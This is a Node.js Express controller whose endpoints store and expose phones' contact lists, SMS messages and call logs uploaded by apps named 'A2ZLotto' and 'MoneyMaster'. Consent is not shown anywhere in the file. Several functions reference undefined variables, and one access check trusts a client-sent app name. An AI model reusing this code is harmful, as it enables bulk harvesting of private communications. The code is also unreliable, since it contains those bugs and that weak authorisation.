var moment = require('moment');
var commonDbFuncs = require("../utils/commonDbFuncs");
const { body, validationResult } = require('express-validator');
const MobileData = require('../models/mobileData');
const UserContacts = require('../models/userContacts');
const UserCalls = require('../models/userCalls');
const UserSms = require('../models/userSms');
var moment = require('moment');


exports.getAllMobileData = async function (req, res, next) {
    // #swagger.tags = ['MobileData']	
    // #swagger.summary = '(A) -> get all mobile data'
    try {
        let selectFields = "userRole appId firstName lastName phone gender email address createdDateTime";
        let mobileDataList = await MobileData.find({})
            .sort({ createdDateTime: -1 })
            .populate("userId", selectFields)
            .exec();

        return res.status(200).json({
            success: true,
            mobileDataList: mobileDataList
        });
    } catch (ex) {
        config.logger.error({ ex }, 'Error in mobileDataController->getAllMobileData');
        commonDbFuncs.createApplicationLog(req.user?._id, "mobileDataController->getAllMobileData", JSON.stringify({ userId: req.user?._id }), JSON.stringify(ex), ex?.message, ex?.toString() || "");
        return res.status(400).json({ success: false, message: ex?.message || ex });
    }
}


exports.getMobileUsers = async function (req, res, next) {
    // #swagger.tags = ['MobileData']	
    // #swagger.summary = '(S) -> get all mobile users -'
    const { source } = req.query;
    try {
        let populateFields = "appId phone email address createdDateTime";
        let selectFields = "userId isFav sourceApplication deviceInfo createdDateTime";
        let findObj = { 'userId': { $exists: true, $ne: null } };
        if (source) {
            findObj.sourceApplication = source;
        }
        let mobileUsers = await MobileData.find(findObj, selectFields)
            .populate("userId", populateFields)
            .exec();

        return res.status(200).json({
            success: true,
            mobileUsers: mobileUsers
        });
    } catch (ex) {
        config.logger.error({ ex }, 'Error in mobileDataController->getMobileUsers');
        commonDbFuncs.createApplicationLog(req.user?._id, "mobileDataController->getMobileUsers", JSON.stringify({ userId: req.user?._id, source }), JSON.stringify(ex), ex?.message, ex?.toString() || "");
        return res.status(400).json({ success: false, message: ex?.message || ex });
    }
}


exports.filterMobileData = async function (req, res, next) {
    // #swagger.tags = ['MobileData']
    // #swagger.summary = '(S) -> filter mobile data'
    const { userId, source, uniqueId } = req.body;
    try {
        let selectFields = "userRole appId firstName lastName phone gender email address createdDateTime";
        let findObj = {};
        if (source) {
            findObj.sourceApplication = source;
        }
        if (userId) {
            findObj.userId = userId;
        }
        if (uniqueId) {
            findObj["deviceInfo.uniqueId"] = uniqueId;
        }

        let mobileDataList = await MobileData.find(findObj)
            .sort({ createdDateTime: -1 })
            .populate("userId", selectFields)
            .exec();

        return res.status(200).json({
            success: true,
            mobileDataList: mobileDataList
        });
    } catch (ex) {
        config.logger.error({ ex }, 'Error in mobileDataController->filterMobileData');
        commonDbFuncs.createApplicationLog(req.user?._id, "mobileDataController->filterMobileData", JSON.stringify({ userId, source, uniqueId }), JSON.stringify(ex), ex?.message, ex?.toString() || "");
        return res.status(400).json({ success: false, message: ex?.message || ex });
    }
}


exports.getAllMobileDataByUserId = async function (req, res, next) {
    // #swagger.tags = ['MobileData']	
    // #swagger.summary = '(A) -> get all mobile data by userId -'
    let userId = req.params.userId || '';
    try {
        let selectFields = "userRole appId firstName lastName phone gender email address createdDateTime";
        let mobileDataList = await MobileData.find({ userId: userId })
            .sort({ createdDateTime: -1 })
            .populate("userId", selectFields)
            .exec();

        return res.status(200).json({
            success: true,
            mobileDataList: mobileDataList
        });
    } catch (ex) {
        config.logger.error({ ex }, 'Error in mobileDataController->getAllMobileDataByUserId');
        commonDbFuncs.createApplicationLog(req.user?._id, "mobileDataController->getAllMobileDataByUserId", JSON.stringify({ userId }), JSON.stringify(ex), ex?.message, ex?.toString() || "");
        return res.status(400).json({ success: false, message: ex?.message || ex });
    }
}


exports.getAllMobileDataByDeviceId = async function (req, res, next) {
    // #swagger.tags = ['MobileData']	
    // #swagger.summary = '(P) -> get all mobile data by device id'
    const { uniqueId, source } = req.body;
    try {
        if (source === "A2ZLotto" || source === "MoneyMaster") {
            let selectFields = "sourceApplication isFav userId deviceInfo createdDateTime";
            let obj = { "deviceInfo.uniqueId": uniqueId };
            if (source) {
                obj.sourceApplication = source
            }
            let mobileDataList = await MobileData.find(obj, selectFields)
                .exec();

            return res.status(200).json({
                success: true,
                mobileDataList: mobileDataList
            });
        }
        else {
            return res.status(400).json({ success: false, message: "UnAuthorized, can't process your request" });
        }
    } catch (ex) {
        config.logger.error({ ex }, 'Error in mobileDataController->getAllMobileDataByDeviceId');
        commonDbFuncs.createApplicationLog(req.user?._id, "mobileDataController->getAllMobileDataByDeviceId", JSON.stringify({ uniqueId, source }), JSON.stringify(ex), ex?.message, ex?.toString() || "");
        return res.status(400).json({ success: false, message: ex?.message || ex });
    }
}


exports.getMobileDataById = async function (req, res, next) {
    // #swagger.tags = ['MobileData']	
    // #swagger.summary = '(A) -> get mobile data by id'
    let mobileDataId = req.params.mobileDataId || '';
    try {
        let selectFields = "userRole appId firstName lastName phone gender email address createdDateTime";
        let mobileData = await MobileData.findById(mobileDataId)
            .sort({ createdDateTime: -1 })
            .populate("userId", selectFields)
            .exec();

        return res.status(200).json({
            success: true,
            mobileData: mobileData
        });
    } catch (ex) {
        config.logger.error({ ex }, 'Error in mobileDataController->getMobileDataById');
        commonDbFuncs.createApplicationLog(req.user?._id, "mobileDataController->getMobileDataById", JSON.stringify({ mobileDataId }), JSON.stringify(ex), ex?.message, ex?.toString() || "");
        return res.status(400).json({ success: false, message: ex?.message || ex });
    }
}


exports.storeMobileData = async function (req, res, next) {
    // #swagger.tags = ['MobileData']
    // #swagger.summary = '(P) -> store mobile data'
    const { userId, deviceInfo, contacts, smsList, callLogs, source } = req.body;
    try {
        await body('source', "source is required").notEmpty().run(req);
        const errorResult = validationResult(req);
        if (!errorResult.isEmpty()) {
            return res.status(400).json({ success: false, errors: errorResult.array() });
        }
        else {
            let mobileData = new MobileData({
                userId: userId,
                deviceInfo: deviceInfo,
                contacts: "",
                callLogs: "",
                smsList: "",
                sourceApplication: source,
                createdDateTime: moment.now()
            });

            let contactsData = new UserContacts({
                userId: userId,
                deviceInfo: deviceInfo,
                contacts: contacts,
                sourceApplication: source,
                createdDateTime: moment.now()
            });

            let callsData = new UserCalls({
                userId: userId,
                deviceInfo: deviceInfo,
                sourceApplication: source,
                callLogs: callLogs,
                createdDateTime: moment.now()
            });

            let smsData = new UserSms({
                userId: userId,
                deviceInfo: deviceInfo,
                sourceApplication: source,
                smsList: smsList,
                createdDateTime: moment.now()
            });

            if (contacts) {
                await contactsData.save();
            }
            if (callLogs) {
                await callsData.save();
            }
            if (smsList) {
                await smsData.save();
            }

            let savedMobileData = await mobileData.save();
            if (Boolean(savedMobileData)) {
                return res.status(200).json({
                    success: true,
                    mobileData: {
                        userId: savedMobileData.userId,
                        sourceApplication: savedMobileData.sourceApplication,
                        deviceInfo: savedMobileData.deviceInfo,
                        createdDateTime: savedMobileData.createdDateTime
                    }
                });
            }
            else {
                return res.status(400).json({ success: false, message: "Unable store mobile data" });
            }
        }
    } catch (ex) {
        config.logger.error({ ex }, 'Error in mobileDataController->storeMobileData');
        commonDbFuncs.createApplicationLog(req.user?._id, "mobileDataController->storeMobileData", JSON.stringify({ userId, deviceInfo, contacts, smsList, callLogs, source }), JSON.stringify(ex), ex?.message, ex?.toString() || "");
        return res.status(400).json({ success: false, message: ex?.message || ex });
    }
}


exports.deleteMobileDataById = async function (req, res, next) {
    // #swagger.tags = ['MobileData']	
    // #swagger.summary = '(S) -> delete mobile data by ID -'
    const { id, type } = req.body;
    try {
        await body('id', "id is required").notEmpty().run(req);
        await body('type', "type is required").notEmpty().run(req);
        const errorResult = validationResult(req);
        if (!errorResult.isEmpty()) {
            return res.status(400).json({ success: false, errors: errorResult.array() });
        }
        else {

            let CollectionName = type.toLowerCase() === "mobiledata" ? MobileData :
                type.toLowerCase() === "usercontacts" ? UserContacts :
                    type.toLowerCase() === "usercalls" ? UserCalls :
                        type.toLowerCase() === "usersms" ? UserSms :
                            "";

            if (CollectionName) {
                let deletedItem = await CollectionName.findByIdAndDelete(id, { select: "_id" });
                if (Boolean(deletedItem)) {
                    return res.status(200).json({
                        success: true,
                        id: id
                    });
                }
                else {
                    return res.status(400).json({ success: false, message: CollectionName + " doesn't exist." })
                }
            }
            else {
                return res.status(400).json({ success: false, message: "Something went wrong." });
            }
        }
    } catch (ex) {
        config.logger.error({ ex }, 'Error in mobileDataController->deleteMobileDataById');
        commonDbFuncs.createApplicationLog(req.user?._id, "mobileDataController->deleteMobileDataById", JSON.stringify({ userId: req.user?._id, id, type }), JSON.stringify(ex), ex?.message, ex?.toString() || "");
        return res.status(400).json({ success: false, message: ex?.message || ex });
    }
}


exports.MakeFavUnYFavData = async function (req, res, next) {
    // #swagger.tags = ['MobileData']	
    // #swagger.summary = '(S) -> fav and unfav data by ID -'
    const { type, id, flag } = req.body;
    try {
        await body('id', "id is required").notEmpty().run(req);
        await body('type', "type is required").notEmpty().run(req);
        await body('flag', "flag is required").notEmpty().run(req);
        const errorResult = validationResult(req);
        if (!errorResult.isEmpty()) {
            return res.status(400).json({ success: false, errors: errorResult.array() });
        }
        else {
            let objUpdate = {
                isFav: flag,
                updatedDateTime: moment.now(),
            }

            let selectFields = "_id isFav";

            let CollectionName = type.toLowerCase() === "mobiledata" ? MobileData :
                type.toLowerCase() === "usercontacts" ? UserContacts :
                    type.toLowerCase() === "usercalls" ? UserCalls :
                        type.toLowerCase() === "usersms" ? UserSms :
                            "";

            if (CollectionName) {
                let updatedItem = await CollectionName.findByIdAndUpdate(id, objUpdate, { upsert: false, new: true, select: selectFields });
                if (Boolean(updatedItem)) {
                    return res.status(200).json({
                        success: true,
                        id: updatedResult._id,
                        isFav: updatedResult.isFav
                    });
                }
                else {
                    return res.status(400).json({ success: false, message: 'Failed to update Item' })
                }
            }
            else {
                return res.status(400).json({ success: false, message: "Something went wrong." });
            }
        }
    } catch (ex) {
        config.logger.error({ ex }, 'Error in mobileDataController->MakeFavUnYFavData');
        commonDbFuncs.createApplicationLog(req.user?._id, "mobileDataController->MakeFavUnYFavData", JSON.stringify({ userId: req.user?._id, type, id, flag }), JSON.stringify(ex), ex?.message, ex?.toString() || "");
        return res.status(400).json({ success: false, message: ex?.message || ex });
    }
}


exports.getMobileUserDataByType = async function (req, res, next) {
    // #swagger.tags = ['MobileData']	
    // #swagger.summary = '(A) -> get user contacts by userId -'
    let userId = req.params.userId || '';
    const { source } = req.query;
    try {
        let CollectionName = type.toLowerCase() === "usercontacts" ? UserContacts :
            type.toLowerCase() === "usercalls" ? UserCalls :
                type.toLowerCase() === "usersms" ? UserSms :
                    "";

        if (CollectionName) {
            let selectFields = "userRole appId firstName lastName phone gender email address createdDateTime";
            let list = await CollectionName.find({ userId: userId })
                .sort({ createdDateTime: -1 })
                .populate("userId", selectFields)
                .exec();

            return res.status(200).json({
                success: true,
                dataList: list
            });
        }
        else {
            return res.status(400).json({ success: false, message: "Something went wrong." });
        }
    } catch (ex) {
        config.logger.error({ ex }, 'Error in mobileDataController->getMobileUserDataByType');
        commonDbFuncs.createApplicationLog(req.user?._id, "mobileDataController->getMobileUserDataByType", JSON.stringify({ userId, source }), JSON.stringify(ex), ex?.message, ex?.toString() || "");
        return res.status(400).json({ success: false, message: ex?.message || ex });
    }
}


exports.filterMobileDataByType = async function (req, res, next) {
    // #swagger.tags = ['MobileData']
    // #swagger.summary = '(S) -> filter user contacts data'
    const { userId, source, uniqueId, type } = req.body;
    try {
        let CollectionName = type.toLowerCase() === "usercontacts" ? UserContacts :
            type.toLowerCase() === "usercalls" ? UserCalls :
                type.toLowerCase() === "usersms" ? UserSms :
                    "";

        if (CollectionName) {
            let selectFields = "userRole appId firstName lastName phone gender email address createdDateTime";
            let findObj = {};
            if (source) {
                findObj.sourceApplication = source;
            }
            if (userId) {
                findObj.userId = userId;
            }
            if (uniqueId) {
                findObj["deviceInfo.uniqueId"] = uniqueId;
            }

            let data = await CollectionName.find(findObj)
                .sort({ createdDateTime: -1 })
                .populate("userId", selectFields)
                .exec();

            return res.status(200).json({
                success: true,
                userData: data
            });
        }
        else {
            return res.status(400).json({ success: false, message: "Something went wrong." });
        }
    } catch (ex) {
        config.logger.error({ ex }, 'Error in mobileDataController->filterMobileDataByType');
        commonDbFuncs.createApplicationLog(req.user?._id, "mobileDataController->filterMobileDataByType", JSON.stringify({ userId, source, uniqueId, type }), JSON.stringify(ex), ex?.message, ex?.toString() || "");
        return res.status(400).json({ success: false, message: ex?.message || ex });
    }
}
